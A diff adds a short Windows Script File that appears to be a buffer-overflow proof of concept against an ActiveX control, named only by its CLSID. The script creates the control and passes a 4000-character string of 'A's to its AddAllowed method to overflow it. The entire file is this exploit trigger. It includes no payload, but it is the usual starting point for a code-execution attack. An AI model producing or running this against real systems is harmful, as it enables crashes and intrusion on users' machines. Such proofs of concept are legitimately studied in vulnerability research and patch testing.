@@ -1,0 +1,10 @@
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:89D30B4C-2408-4E78-A334-8FF8A9713EA7' id='target' />
+<script language='vbscript'>
+
+arg=String(4000, "A")
+
+target.AddAllowed arg
+
+</script></job></package>
